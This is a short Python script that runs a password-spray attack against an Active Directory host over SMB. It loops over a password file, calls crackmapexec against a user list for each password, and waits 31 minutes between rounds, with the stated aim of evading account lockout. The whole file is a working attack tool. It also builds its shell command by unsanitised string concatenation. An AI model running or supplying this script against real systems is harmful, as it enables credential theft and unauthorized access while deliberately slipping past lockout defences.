#password spray AD every 31 minutes to avoid account lockout

import os
import time

with open('password.txt') as f:
 for line in f:
  print("===================================================================================================")	
  print()	
  print()
  print("testing with password: "+ line)
  os.system('cme smb 172.18.1.116 -u users.txt --continue-on-success -p ' +line)
  print()	
  print("sleeping")	
  time.sleep(1860) # Sleep for 31 minutes
  print()	

